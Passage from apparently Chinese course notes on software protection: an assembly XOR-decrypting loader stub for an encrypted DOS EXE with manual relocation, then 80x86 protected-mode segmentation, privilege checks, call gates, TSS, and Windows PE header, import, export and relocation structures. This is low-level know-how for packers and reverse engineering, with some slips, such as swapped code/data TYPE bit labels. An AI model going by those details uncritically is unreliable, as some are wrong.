解决的办法是：利用CS作为代码段（因为CS是自动置位的，或者说在加密程序中修改文件头的时候调整好了），然后用 <code>call next:; next; pop bx;</code>。这样子可以获得next的真实位置。相当于有了一个定位的标准，可以利用它计算出我们shell的第一个地址。
B：正确的重定位源程序的重定位项目。因为源程序在加密后，原本自动的重定位就不能用了。我们需要手动的进行重定位。步骤如下</p>
<ol>
<li>我们要利用文件头找到重定位项的<strong>相对位置</strong>。（利用上面的文件头的介绍）</li>
<li>利用程序的加载地址算出<strong>绝对位置</strong>，（这个要计算出程序的加载位置，<code>PSP+0x10</code>。那么我们如何得到PSP呢？事实上，在程序载入的时候，会自动的把<code>DS</code>和<code>ES</code>设置成<code>PSP</code>。）</li>
<li>对绝对位置的变量进行<strong>重定位</strong>。（在DOS中的重定位是很简单的，<strong>原先的段地址+程序的载入地址</strong>就好了）</li>
</ol>
<pre><code class="language-asm">;例程，这里的解密就是简单的异或
_IP = 14h
_CS = 16h
HEAD_LEN = 08h
LEN_SEC = 4h
LEN_REM =2h
RE_NUM = 6h
RE_ADDR = 18h

.386
code segment use16
assume cs:code
main:
	push es
	call next
	next:
	pop si		
	sub si,offset next-offset main	;main的真实地址
	mov ax,es
	add ax,10h
	mov word ptr cs:[si+load_addr],ax	;程序的加载起始地址psp+0x10
	jmp decipher
	load_addr dw 0
decipher:
	mov es,ax
	xor edx,edx
	xor eax,eax

	mov dx,word ptr cs:head[si+LEN_SEC]
	cmp word ptr cs:head[si+LEN_REM],0
	je not_sub_1
		sub dx,1
	not_sub_1:
	shl edx,9
	add dx,word ptr cs:head[si+LEN_REM]	
	mov ax,word ptr cs:head[si+HEAD_LEN]		
	shl eax,4				
	sub edx,eax				;edx = program载入内存的长度
	xor ebx,ebx
	de_loop:
		xor byte ptr es:[bx],33h
		add ebx,1
		cmp bx,0
		jne not_flow
			mov ax,es
			add ax,1000h
			mov es,ax
		not_flow:
		cmp ebx,edx
		jne de_loop

reorient:
	mov cx,word ptr cs:head[si+RE_NUM]
	mov bx,word ptr cs:head[si+RE_ADDR]
	re_loop:
		cmp cx,0
		je return
		mov ax,word ptr cs:head[si+bx+2]		
		add ax,word ptr cs:[si+load_addr]
		mov es,ax				;段地址
		mov di,word ptr cs:head[si+bx]		;偏移地址

		mov ax,word ptr es:[di]		
		add ax,word ptr cs:[si+load_addr]
		mov word ptr es:[di],ax
		sub cx,1
		add bx,4
		jmp re_loop
return:
	pop es
	mov ax,word ptr cs:head[si+_CS]
	add ax,word ptr cs:[si+load_addr]
	push ax
	push word ptr cs:head[si+_IP]
	retf
head:
code ends
end main
</code></pre>
<h2 id="lesson7-80x86保护模式程序设计"><a class="header" href="#lesson7-80x86保护模式程序设计">Lesson7 80x86保护模式程序设计</a></h2>
<h3 id="特殊的寄存器"><a class="header" href="#特殊的寄存器">特殊的寄存器</a></h3>
<p>80x86处理器提供了 4 个<strong>内存管理寄存器</strong>（GDTR、LDTR、IDTR 和 TR），用于指定内存分段管理所用系统表的基地址。</p>
<ul>
<li>GDTR和LDTR分别存储着global和local的<strong>descriptor table</strong>的基地址。</li>
<li>IDTR存储着中断表的位置，可以认为是RISCV中对应于stvec。</li>
<li>任务寄存器TR用于存放当前任务 TSS 段的 16 位段选择符、32 位基地址、16 位段长度和描述符属性值。它引用 GDT 表中的一个 TSS 类型的描述符。</li>
</ul>
<p>![img](../../../../../Program Files/Typora/软件保护技术 _ Reticence_files/1611663696683.jpg)</p>
<p>我们还有4个<strong>控制寄存器</strong>（CR0、CR1、CR2 和 CR3）用于控制和确定处理器的操作模式以及当前执行任务的特性。要记住的是CR0的第0位决定CPU处于保护模式还是实模式。</p>
<p>![img](../../../../../Program Files/Typora/软件保护技术 _ Reticence_files/1611663703212.jpg)</p>
<p>CR0格式描述：</p>
<div class="table-wrapper"><table><thead><tr><th>Bit</th><th>Name</th><th>Full Name</th><th>Description</th></tr></thead><tbody>
<tr><td><strong>0</strong></td><td><strong>PE</strong></td><td><strong>Protected Mode Enable</strong></td><td><strong>If 1, system is in protected mode(保护模式), else system is in real mode(实模式)</strong></td></tr>
<tr><td>1</td><td>MP</td><td>Monitor co-processor</td><td>Controls interaction of WAIT/FWAIT instructions with TS flag in CR0</td></tr>
<tr><td>2</td><td>EM</td><td>Emulation</td><td>If set, no x87 <a href="https://en.wikipedia.org/wiki/Floating-point_unit">floating-point unit</a> present, if clear, x87 FPU present</td></tr>
<tr><td>3</td><td>TS</td><td>Task switched</td><td>Allows saving x87 task context upon a task switch only after x87 instruction used</td></tr>
<tr><td>4</td><td>ET</td><td>Extension type</td><td>On the 386, it allowed to specify whether the external math coprocessor was an <a href="https://en.wikipedia.org/wiki/80287">80287</a> or <a href="https://en.wikipedia.org/wiki/80387">80387</a></td></tr>
<tr><td>5</td><td>NE</td><td>Numeric error</td><td>Enable internal <a href="https://en.wikipedia.org/wiki/X87">x87</a> floating point error reporting when set, else enables PC style x87 error detection</td></tr>
<tr><td>16</td><td>WP</td><td>Write protect</td><td>When set, the CPU can't write to read-only pages when privilege level is 0</td></tr>
<tr><td>18</td><td>AM</td><td>Alignment mask</td><td>Alignment check enabled if AM set, AC flag (in <a href="https://en.wikipedia.org/wiki/FLAGS_register">EFLAGS</a> register) set, and privilege level is 3</td></tr>
<tr><td>29</td><td>NW</td><td>Not-write through</td><td>Globally enables/disable <a href="https://en.wikipedia.org/wiki/Write_through_cache">write-through caching</a></td></tr>
<tr><td>30</td><td>CD</td><td>Cache disable</td><td>Globally enables/disable the memory cache</td></tr>
<tr><td><strong>31</strong></td><td><strong>PG</strong></td><td><strong>Paging</strong></td><td><strong>If 1, enable <a href="https://en.wikipedia.org/wiki/Paging">paging</a> and use the <a href="https://en.wikipedia.org/wiki/Control_register#CR3">§ CR3</a> register, else disable paging.</strong></td></tr>
</tbody></table>
</div>
<p>这些寄存器都有专门的指令来控制，不能直接用mov，具体的可以参考Intel的手册。</p>
<p>80x86提供了分段和分页两种<strong>内存保护</strong>的方式。分页在操作系统讲过了（虽然主要关注了RISCV，但是差不多），这里讲分段。</p>
<p>保护模式和实模式的区别主要在于段地址。实模式寻址就是<code>段地址&lt;&lt;4+偏移地址</code>。
我们来看保护模式。为了定位指定一个字节，程序必须提供一个<strong>逻辑地址</strong>。逻辑地址包括一个<strong>段选择符</strong>和一个<strong>偏移量</strong>。比如我们要在<strong>保护模式</strong>下访问<code>10h:[10000h]</code>的内容，过程是：我们在GDT表中用段地址<code>10h</code>寻找一个<strong>Descriptor</strong>，找到段首地址<code>11223344h</code>，那么我们寻址<code>11223344h+10000h</code></p>
<h3 id="段选择符selector"><a class="header" href="#段选择符selector">段选择符Selector</a></h3>
<p>![img](../../../../../Program Files/Typora/软件保护技术 _ Reticence_files/1611665531025.jpg)
保护模式的分段机制保留了以前的段寄存器<strong>CS,DS,ES,SS</strong>, 并且增加了两个<strong>FS,GS</strong>。这些段寄存器里面保存的不再是段的基地址了, 而是一个<strong>段选择子</strong>, 段选择子是一个如下的结构:</p>
<pre><code class="language-c">struct SegSelector 
{
	unsigned int RPL : 2 bit;
	unsigned int PI  : 1 bit;
	unsigned int Index : 13 bit;
}
</code></pre>
<ul>
<li>请求特权级字段 RPL 提供了段保护信息，将在后面作详细说明。</li>
<li>表索引字段 TI 用来指出包含指定段描述符的段描述符表 GDT 或 LDT。TI=0 表示描述符在 GDT 中；TI=1 表示描述符在 LDT 中。</li>
<li>索引字段 Index给出了描述符在 GDT 或 LDT 表中的索引项号。</li>
</ul>
<p>为了避免每次都要到内存中索引Descriptor的内容，段寄存器会缓存。但是这对我们来说是不可见的，我们可见的只是Selector部分。</p>
<h3 id="gdt和descriptor"><a class="header" href="#gdt和descriptor">GDT和Descriptor</a></h3>
<p>![img](../../../../../Program Files/Typora/软件保护技术 _ Reticence_files/1611665501165.jpg)
GDT表的地址存储在寄存器GDTR中。GDT表中的每一个Entry都是8 byte的 <strong>Descriptor(描述符)</strong>。</p>
<blockquote>
<p>gdt+10h：<strong>FF,FF</strong>,<em>44,33,22</em>,93,8<strong>F</strong>,<em>11</em></p>
</blockquote>
<pre><code>gdt+00h  ...; 首个描述符为空描述符,不和任何段寄存器关联
gdt+08h  ...

gdt+10h FFh 
gdt+11h FFh; 斜体是段首地址, 粗体是(段长度-1)
gdt+12h 44h; 段首地址低16位的低8位  
gdt+13h 33h; 段首地址低16位的高8位
gdt+14h 22h; 段首地址高16位的低8位
gdt+15h 93h; 段访问权限(access)  
gdt+16h 0Fh; 最高位为粒度位,低4位为20位段长度的高4位 
gdt+17h 11h; 段首地址高16位的高8位 
</code></pre>
<ul>
<li>段限长字段 LIMIT（Segment limit field）
段限长 Limit 字段用于指定段的长度。处理器会把段描述符中两个段限长字段组合成一个 20 位的值，并根据<strong>颗粒度标志 G</strong> 来指定段限长 Limit 值的实际含义。如果 G=0，则段长度 Limit 范围可从 1 字节到 1MB 字节，单位是字节。如果 G=1，则段长度 Limit 范围可从 4KB 到 4GB，单位是4KB。
根据段类型中的<strong>段扩展方向标志 E</strong>，处理器以两种不同方式使用段限长 Limit。对于向上扩展的段（简称上扩段），逻辑地址中的偏移值范围可以从 0 到段限长值 Limit。大于段限长 Limit 的偏移值将产生一般保护性异常。对于向下扩展的段（简称下扩段），段限长 Limit 的含义相反。根据默认栈指针大小标志 B 的设置，偏移值范围可从段限长 Limit 到 0xFFFFFFFF 或 0xFFFF。而小于段限长 Limit 的偏移值将产生一般保护性异常。对于下扩段，减小段限长字段中的值会在该段地址空间底部分配新的内存，而不是在顶部分配。80X86 的栈总是向下扩展的，因此这种实现方式很适合扩展堆栈。</li>
<li>基地址字段 BASE（Base address field）
该字段定义在 4GB 线性地址空间中一个段字节 0 所处的位置。处理器会把 3 个分立的基地址字段组合形成一个 32 位的值。段基地址应该对齐 16 字节边界。虽然这不是要求的，但通过把程序的代码和数据段对齐在 16 字节边界上，可以让程序具有最佳性能。</li>
<li>Access，段描述符的第5个字节（从0开始计）：
<ul>
<li>4 bit段类型字段 TYPE（Type field）类型字段指定段或门（Gate）的类型、说明段的访问种类以及段的扩展方向。**该字段的解释依赖于描述符类型标志 S 指明是一个应用（代码或数据）描述符还是一个系统描述符。**TYPE 字段的编码对代码、数据或系统描述符都不同。</li>
<li>1 bit 描述符类型标志 S（Descriptor type flag）描述符类型标志S指明一个段描述符是<strong>系统段描述符（当S=0）还是代码或数据段描述符（当S=1）。</strong></li>
<li>2 bit 描述符特权级字段 DPL（Descriptor privilege level）<strong>DPL 字段指明描述符的特权级。特权级范围从 0 到 3。0 级特权级最高，3 级最低。DPL 用于控制对段的访问。</strong></li>
<li>1 bit 段存在标志 P（Segment present）段存在标志 P 指出一个段是在内存中（P=1）还是不在内存中（P=0）。当一个段描述符的 P 标志为 0 时，那么把指向这个段描述符的选择符加载进段寄存器将导致产生一个段不存在异常。有点像Valid bit，但是这个不是页表。</li>
</ul>
</li>
<li>颗粒度标志 G（Granularity）该字段用于确定段限长字段 Limit 值的单位。如果颗粒度标志为 0，则段限长值的单位是字节；如果设置了颗粒度标志，则段限长值使用 4KB 单位。（这个标志不影响段基地址的颗粒度，基地址的颗粒度总是字节单位）。</li>
</ul>
<p>我们来具体的看一下TYPE字段规定的段的权限类型：</p>
<ul>
<li>如果描述符类型标志 S=1，那么是代码或者数据描述符。
<ul>
<li>如果TYPE的第3 bit=1，那么这个段是Code段。
<ul>
<li>0 bit = Access，表示是否已经被访问过。</li>
<li>1 bit = Write，表示是否可写。<code>W=1</code>可写。</li>
<li>2 bit = Expand，表示段的扩展方向。<code>E=0</code>向上扩展，<code>E=1</code>向下扩展（比如用于栈）。</li>
</ul>
</li>
<li>如果TYPE的第3 bit=0，那么这个段是Data段。
<ul>
<li>0 bit = Access，表示是否已经被访问过。</li>
<li>1 bit = Read，表示是否可读。如果为0的话不可读仅执行。</li>
<li>2 bit = Comfirm，</li>
</ul>
</li>
</ul>
</li>
<li>如过描述符类型标志 S=0，那么是系统描述符。
<ul>
<li>分成TSS和Gate两种类型。</li>
</ul>
</li>
</ul>
<p>是不是觉得非常的复杂而不优美，比RISCV差远了。</p>
<h3 id="权限保护"><a class="header" href="#权限保护">权限保护</a></h3>
<p>为了在各个代码段和数据段之间进行特权级检测处理，处理器可以识别以下三种类型的特权级：</p>
<ul>
<li>当前特权级 CPL（Current Privilege Level）。CPL 是当前正在执行程序或任务的特权级。它存放在CS 和 SS 段寄存器的位 0 和位 1 中。通常，CPL 等于当前代码段的特权级。当程序把控制转移到另一个具有不同特权级的代码段中时，处理器就会改变 CPL。
当访问一个一致性（conforming）代码段时，则处理器对 CPL 的设置有些不同。特权级值高于（即低特权级）或等于一致代码段DPL 的任何段都可以访问一致代码段。并且当处理器访问一个特权级不同于 CPL 的一致代码段时，CPL 并不会被修改成一致代码段的 DPL。</li>
<li>描述符特权级 DPL（Descriptor Privilege Level）。DPL 是一个段或门的特权级。它存放在段或门描述符的 DPL 字段中。</li>
<li>请求特权级 RPL（Request Privilege Level）。RPL 是一种赋予段选择符的超越特权级，它存放在Selector的位 0 和位 1 中。处理器会同时检查 RPL 和 CPL，以确定是否允许访问一个段。</li>
</ul>
<p>检查方法：</p>
<ul>
<li><code>max{CPL,RPL} &lt;= DPL</code> 时，当前进程才可以访问该DPL对应的<strong>数据</strong>段（允许高级的访问低级的数据），或者是通过Gate的访问。</li>
<li><code>min{CPL,RPL} &gt;= DPL</code> 时，当前进程才可以访问该DPL对应的<strong>代码</strong>段（允许低级的调用高级的代码）（这里的调用指的是call，jmp只能在同级别之间跳）（不知道retf能不能实现绕过这个限制）</li>
<li><a href="https://www.cnblogs.com/longdouhzt/archive/2012/11/01/2749739.html">CPL,DPL,RPL的区别</a>。<strong>CPL</strong>是当前进程的权限级别(Current Privilege Level)，<strong>RPL</strong>说明的是进程对段访问的请求权限(Request Privilege Level)，<strong>DPL</strong>存储在<strong>段描述符</strong>中，规定访问该段的权限级别(Descriptor Privilege Level)。一般情况下，CPL==RPL，但是在Gate这个场景下，CPL和RPL就不同了。RPL可以认为是老CS(调用者)的CPL，CPL是现在CS的CPL。
这样可以实现low previlege call high previlege之后，依然无法访问那些不能访问的数据。</li>
</ul>
<h3 id="gate"><a class="header" href="#gate">Gate</a></h3>
<p>比如，我们在ring3调用ring0的readfile()函数，那么我们岂不是可以获得0级别然后在任意地方读写了？
当我们从ring3 call ring0(准确来说是低权限调用高权限代码)的时候，需要 call gate。</p>
<p>gate描述的是一个内存的“点”或者说描述的是一个<strong>函数指针</strong>，指向一个函数。</p>
<pre><code>gate的结构：
offset_0_15		+0+1	目标函数的偏移地址的低16位
selector		+2+3	目标函数的段地址
arg_count		+4		目标函数需要的参数
attrib			+5		权限，格式参见上面的access
offset_16_32	+6+7	目标函数的偏移地址的高16位
</code></pre>
<p>为啥不能直接call ring0的代码？
当我们<code>call 10h:00000000h</code>时（假设10h处是gate）,我们会根据gate的内容跳到对应的函数。
在call gate的时候，我们会<strong>切换堆栈</strong>（tss中的ss0/ss1/ss2/ss3）（防止堆栈内的老cs被修改，可以通过多线程技术）</p>
<pre><code>push old cs		;然后就可以知道调用者的权限了
arpl ax,cx		;其中，cx=cs，ax是调用者传过来的段地址 if(ax.RPL &lt; cx.RPL) ax.RPL = cx.RPL
</code></pre>
<p>call gate： <code>max{CPL,RPL} &lt;= gate.DPL</code>，虽然权限检查和数据段一样，但是gate其实是指向一个代码段的指针。通过了这个权限检查就能取出这个指针，然后再进行<code>min{CPL,RPL} &gt;= DPL</code>。s</p>
<h3 id="tss"><a class="header" href="#tss">TSS</a></h3>
<p>从3=&gt;0用call gate\task state segment(TSS)
用retf实现从0=&gt;3</p>
<p>TSS是一个结构，用来保存当前进程的<strong>所有</strong>寄存器。从常见的通用寄存器到cr3(页目录表寄存器)等。
3对堆栈指针：<code>ss0:esp0, ss1:esp1, ss2:esp2</code>
<code>A call tss_B</code>, tss_B成员有一个back_link指向 tss_A。(这里是利用tss切换任务，和平时的call是不一样的，不会在堆栈里push东西)。
<strong>硬件会自动的把A所有寄存器的状态保存到tss_A中，然后从tss_B中加载寄存器</strong>
在这种情况的call要用iret返回，不能用retf或ret。</p>
<p>tss在GDT表也有一个tss descriptor.
Intel规定每一个任务是不能被<strong>重入</strong>的。tss描述符的access=89h(not busy) or 8Bh(busy)。处于busy状态的tss是不能被call/jmp的。</p>
<p>segment descriptor cache(shadow) 段寄存器在CPU内部有一个影子描述符
只要你不更改cs，我们就用影子描述符。</p>
<h2 id="lesson8-windows-pe文件格式"><a class="header" href="#lesson8-windows-pe文件格式">Lesson8 Windows PE文件格式⭐️⭐️</a></h2>
<p>白老师讲的都是win32，64位的PE文件结构大同小异，但是偏移地址肯定是不同了。</p>
<p>你可以认为PE文件是一个DOS下的可执行文件（MZ格式），因为他有一个DOS Header和DOS Stub，如果在DOS运行的话会输出一行“This program cannot be run in DOS&quot;然后退出。但是我们并不关心PE的DOS部分，我们唯一需要关注的是一个”e_lfanew&quot;成员，表明了<strong>PE文件头</strong>在PE文件中的偏移。</p>
<ul>
<li><strong>DOS头+3C</strong>(e_lfanew)：此处有一个指针，指向PE头。接下去我们讲述的地址，基地址都是此处。</li>
</ul>
<h3 id="pe-header"><a class="header" href="#pe-header">PE Header</a></h3>
<p><img src="Basic/../images/1611716240282.jpg" alt="img" />
qv-F8可以查看文件头</p>
<p>我们定位到这里，看到两个字节<code>50,45</code>，就是<code>PE</code>，从此处开始是真正的PE文件头。PE文件头中描述的内存地址均采用<strong>RVA</strong>（reletive virtual address），RVA必须加上<strong>base address</strong>才得到真正的地址。PE文件头也载入了内存。</p>
<p>我们来看PE头的结构(来自看雪论坛的整理)：</p>
<pre><code class="language-c">typedef struct _IMAGE_NT_HEADERS {  
    DWORD Signature;  
    IMAGE_FILE_HEADER FileHeader;  
    IMAGE_OPTIONAL_HEADER32 OptionalHeader;  
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;  

structIMAGE_FILE_HEADER
{
    WORD Machine;//运行平台
    WORD NumberOfSections;//区块表的个数
    DWORD TimeDataStamp;//文件创建时间，是从1970年至今的秒数
    DWORD PointerToSymbolicTable;//指向符号表的指针
    DWORD NumberOfSymbols;//符号表的数目
    WORD SizeOfOptionalHeader;//IMAGE_NT_HEADERS结构中OptionHeader成员的大小，对于win32平台这个值通常是0x00e0
    WORD Characteristics;//文件的属性值
}

typedefstruct_IMAGE_OPTIONAL_HEADER
{
//
// Standard fields.  
//
+18h    WORD    Magic;// 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）
+1Ah    BYTE    MajorLinkerVersion;// 链接程序的主版本号
+1Bh    BYTE    MinorLinkerVersion;// 链接程序的次版本号
+1Ch    DWORD   SizeOfCode;// 所有含代码的节的总大小
+20h    DWORD   SizeOfInitializedData;// 所有含已初始化数据的节的总大小
+24h    DWORD   SizeOfUninitializedData;// 所有含未初始化数据的节的大小
+28h    DWORD   AddressOfEntryPoint;// 程序执行入口RVA
+2Ch    DWORD   BaseOfCode;// 代码的区块的起始RVA
+30h    DWORD   BaseOfData;// 数据的区块的起始RVA
//
// NT additional fields.    以下是属于NT结构增加的领域。
//
+34h    DWORD   ImageBase;// 程序的首选装载地址
+38h    DWORD   SectionAlignment;// 内存中的区块的对齐大小
+3Ch    DWORD   FileAlignment;// 文件中的区块的对齐大小
+40h    WORD    MajorOperatingSystemVersion;// 要求操作系统最低版本号的主版本号
+42h    WORD    MinorOperatingSystemVersion;// 要求操作系统最低版本号的副版本号
+44h    WORD    MajorImageVersion;// 可运行于操作系统的主版本号
+46h    WORD    MinorImageVersion;// 可运行于操作系统的次版本号
+48h    WORD    MajorSubsystemVersion;// 要求最低子系统版本的主版本号
+4Ah    WORD    MinorSubsystemVersion;// 要求最低子系统版本的次版本号
+4Ch    DWORD   Win32VersionValue;// 莫须有字段，不被病毒利用的话一般为0
+50h    DWORD   SizeOfImage;// 映像装入内存后的总尺寸
+54h    DWORD   SizeOfHeaders;// 所有头 + 区块表的尺寸大小
+58h    DWORD   CheckSum;// 映像的校检和
+5Ch    WORD    Subsystem;// 可执行文件期望的子系统
+5Eh    WORD    DllCharacteristics;// DllMain()函数何时被调用，默认为 0
+60h    DWORD   SizeOfStackReserve;// 初始化时的栈大小
+64h    DWORD   SizeOfStackCommit;// 初始化时实际提交的栈大小
+68h    DWORD   SizeOfHeapReserve;// 初始化时保留的堆大小
+6Ch    DWORD   SizeOfHeapCommit;// 初始化时实际提交的堆大小
+70h    DWORD   LoaderFlags;// 与调试有关，默认为 0
+74h    DWORD   NumberOfRvaAndSizes;// 下边数据目录的项数，这个字段自Windows NT 发布以来一直是0x10。所以可以把他当作锚点寻找输入表输出表。
+78h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
// 数据目录表
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

IMAGE_DATA_DIRECTORY STRUCT
    VirtualAddress    DWORD       ?   ; 数据的起始RVA
    Size             DWORD       ?   ; 数据块的长度
IMAGE_DATA_DIRECTORY ENDS 
</code></pre>
<p>重要的信息如下所示：</p>
<div class="table-wrapper"><table><thead><tr><th>偏移</th><th>长度</th><th>含义</th></tr></thead><tbody>
<tr><td>+0</td><td>4</td><td>Signature</td></tr>
<tr><td>+6</td><td>2</td><td>NumberOfSections</td></tr>
<tr><td>+0x28</td><td>4</td><td>AddressOfEntryPoint</td></tr>
<tr><td>+0x34</td><td>4</td><td>ImageBase</td></tr>
<tr><td>+0x38</td><td>4</td><td>SectionAlignment</td></tr>
<tr><td>+0x3c</td><td>4</td><td>FileAlignment</td></tr>
<tr><td>+0x50</td><td>4</td><td>SizeOfImage</td></tr>
<tr><td>+0x54</td><td>4</td><td>SizeOfHeaders</td></tr>
<tr><td>+0x78</td><td>4</td><td></td></tr>
<tr><td>+0x7C</td><td>4</td><td></td></tr>
<tr><td>+0x80</td><td>4</td><td></td></tr>
<tr><td>+0x84</td><td>4</td><td></td></tr>
<tr><td>+0x88</td><td>4</td><td></td></tr>
<tr><td>+0x8C</td><td>4</td><td></td></tr>
<tr><td>+0xA0</td><td>4</td><td></td></tr>
<tr><td>+0xA4</td><td>4</td><td></td></tr>
</tbody></table>
</div>
<h3 id="section-header"><a class="header" href="#section-header">Section Header</a></h3>
<p><img src="Basic/../images/1611716231968.jpg" alt="" />
<strong>Section Table</strong>总是被存放在紧接在<strong>PE Header</strong>的地方。我们可以看到数据目录从PE+0x78开始，而且总是0x10项。所以开始地址就是PE+0x78+0x80。</p>
<p>节表由一系列的<strong>Section Header</strong>(0x28个字节)排列而成，每个结构用来描述一个节，结构的排列顺序和它们描述的节在文件中的排列顺序是一致的。全部有效结构的最后以一个空的<strong>Section Header</strong>作为结束。下面我们来看<strong>Section Header</strong>的定义：</p>
<pre><code class="language-c">typedef struct _IMAGE_SECTION_HEADER {
    BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
    union {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
    } Misc;
    DWORD VirtualAddress;
    DWORD SizeOfRawData;
    DWORD PointerToRawData;
    DWORD PointerToRelocations;
    DWORD PointerToLinenumbers;
    WORD  NumberOfRelocations;
    WORD  NumberOfLinenumbers;
    DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
</code></pre>
<p>重要的信息如下所示：</p>
<div class="table-wrapper"><table><thead><tr><th>相对于首字节的偏移</th><th>长度</th><th>含义</th></tr></thead><tbody>
<tr><td>+0</td><td>8</td><td>段的名字字符串，不需要末尾的0。段的名字是不重要的，只是约定俗成是那几个。</td></tr>
<tr><td>+8</td><td>4</td><td>节的内存长度</td></tr>
<tr><td>+C</td><td>4</td><td>节的内存偏移，RVA。要对齐。</td></tr>
<tr><td>+10</td><td>4</td><td>节的文件长度</td></tr>
<tr><td>+14</td><td>4</td><td>节的文件内偏移，Physical offset。要对齐</td></tr>
<tr><td>+24</td><td>4</td><td>节的属性(attribute)</td></tr>
</tbody></table>
</div>
<p>如何查看内存的内容在文件中的位置：<code>RVA-RVA(Segment)+PA(Segment)</code></p>
<ol>
<li>首先定位在哪个段</li>
<li>找到在这个段内的偏移，内存偏移-段的偏移</li>
<li>段内偏移+段的文件内偏移</li>
</ol>
<h3 id="输入表"><a class="header" href="#输入表">输入表</a></h3>
<p><img src="Basic/../images/1611716219337.jpg" alt="img" />
<strong>输入函数（Import Functions)**就是被程序调用但其执行代码又不在程序中的函数。只有动态链接函数才会产生这种情况。为了正确寻址到输入函数，我们需要输入表的帮助。并且显然，输入表的内容是需要**链接器</strong>和<strong>装载器</strong>共同配合的。</p>
<p>输入表中的每一项是0x14个字节，输入表的结束用0x14个0作为标志。输入表的C语言定义如下：</p>
<pre><code class="language-c">struct _IMAGE_IMPORT_DESCRIPTOR {
    union {
        DWORD Characteristics;
        DWORD OriginalFirstThunk;   
    };
    DWORD TimeDateStamp;
    DWORD ForwarderChain;
    DWORD Name;           
    DWORD FirstThunk;       
} IMAGE_IMPORT_DESCRIPTOR;
</code></pre>
<p>重要的条目：</p>
<div class="table-wrapper"><table><thead><tr><th>偏移</th><th>长度</th><th>内容</th></tr></thead><tbody>
<tr><td>+0</td><td>4</td><td>指针，指向<strong>API的名字指针表</strong>（RVA）</td></tr>
<tr><td>+C</td><td>4</td><td>指向DLL的名字字符串（RVA）</td></tr>
<tr><td>+10</td><td>4</td><td>指针，指向<strong>API的地址指针表</strong>（RVA）</td></tr>
</tbody></table>
</div>
<p><strong>API的名字指针表</strong>：每一项又是一个4byte的指针，指向<strong>API的名字字符串</strong>。表的结束用4个0作为标志。如果你发现表中的项最高位是1，那么这一项把最高位去除后是<strong>API的序号</strong>，不再是名字字符串指针了。这个名字字符串由两位的API序号和API的C字符串组成。</p>
<p><strong>API的地址指针表</strong>：我们在文件中可以看到他和API的名字指针表的内容是一样的，但是在载入内存之后这张表是会变的。具体的说，就是会在这里填入我们调用函数在内存中的地址。我们上面讲API的重定位的时候，<code>jmp</code>后面的地址就是存储在这里。</p>
<p>需要注意的是，这里的DLL的名字字符串和API的名字字符串都是<strong>标准的C语言字符串，以<code>0</code>结尾。</strong></p>
<h3 id="输出表-dll"><a class="header" href="#输出表-dll">输出表 DLL</a></h3>
<p><img src="Basic/../images/1611716212577.jpg" alt="img" />
我们知道DLL是不可以独立运行的，那么DLL文件头处的<code>AddressOfEntryPoint</code>字段是什么意思呢。当操作系统把动态链接库载入内存的时候，会调用一次<code>AddressOfEntryPoint</code>处的代码，要做的工作可能一些初始化工作，我们把这一段代码称为dll main；也可能是一些释放工作。</p>
<p>一个DLL是一定会有输出表的，因为他要把提供的函数接口导出。注意到一个程序可能会引用多个外部的DLL，所以输入表的每一项要对应一个DLL。但是一个DLL是只能导出一个DLL的函数的（废话）。所以他们的结构有所不同。</p>
<pre><code>typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;    // 未使用，总为0
    DWORD   TimeDateStamp;      // 文件创建时间戳
    WORD    MajorVersion;       // 未使用，总为0
    WORD    MinorVersion;       // 未使用，总为0
    DWORD   Name;               // 指向一个代表此 DLL名字的 ASCII字符串的 RVA
    DWORD   Base;               // 函数的起始序号
    DWORD   NumberOfFunctions;  // 导出函数的总数
    DWORD   NumberOfNames;      // 以名称方式导出的函数的总数
    DWORD   AddressOfFunctions;     // 指向输出函数地址的RVA
    DWORD   AddressOfNames;         // 指向输出函数名字的RVA
    DWORD   AddressOfNameOrdinals;  // 指向输出函数序号的RVA
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
</code></pre>
<p>重要的条目：</p>
<div class="table-wrapper"><table><thead><tr><th>偏移</th><th>长度</th><th>内容</th></tr></thead><tbody>
<tr><td>+C</td><td>4</td><td>指向DLL的名字字符串（RVA）</td></tr>
<tr><td>+10</td><td>4</td><td>API序号的基数，通常为1</td></tr>
<tr><td>+18</td><td>4</td><td>表示一共导出的函数个数</td></tr>
<tr><td>+1C</td><td>4</td><td>指向<strong>API地址表RVA</strong></td></tr>
<tr><td>+20</td><td>4</td><td>指向<strong>API名字指针表RVA</strong></td></tr>
<tr><td>+24</td><td>4</td><td>指向<strong>API序号表RVA</strong></td></tr>
</tbody></table>
</div>
<p>这个<strong>DLL名</strong>和<strong>DLL文件名</strong>没有必然的联系（虽然但是这不重要）。</p>
<p><strong>API地址表</strong>：每一项是一个4 byte的指针，指向API函数的地址。<strong>API地址表的条目和上面两个不是一一对应的，我们要用api的序号作为index在API地址表里寻找API的地址。</strong>
<strong>API名字指针表</strong>：每一项又是一个4 byte的指针，指向<strong>API的名字字符串</strong>。但是表的结束<strong>不用</strong>4个0作为标志，因为我们已经存储了导出的函数个数。这里的名字字符串是单纯的C字符串，没有两位的前缀序号了。api名字指针表是字典序排列的。
<strong>API序号表</strong>：每一项是2 byte的序号。<strong>序号表和条目和名字指针表的条目是一一对应的</strong>。</p>
<ol>
<li>找到API的名字 <code>name_table[i]</code></li>
<li>找到对应的API的序号 <code>n=order_table[i]</code></li>
<li>找到API的地址 <code>address_table[n]</code></li>
</ol>
<h3 id="重定位表-dll"><a class="header" href="#重定位表-dll">重定位表 DLL</a></h3>
<p><img src="Basic/../images/1611717484041.jpg" alt="img" />
DLL内部的变量，在载入内存的时候，他们的地址可能发生变化。如果我们用的是相对地址，那还好；但是如果我们用的是绝对地址就完了，或者说我们在编译的时候不能确定运行时变量的地址。所以我们需要对DLL中的地址进行重定位。要重定位的只是偏移地址，在现在的windows里段地址都是0。</p>
<pre><code>比如，base addr = 0x400000
dll中有这样一条语句：
mov eax, [401000h]
假设dll被载入到内存0x100000处，则指令需要修正为
mov eax, [101000h]
typedef struct _IMAGE_BASE_RELOCATION {
    DWORD   VirtualAddress;	//RVA
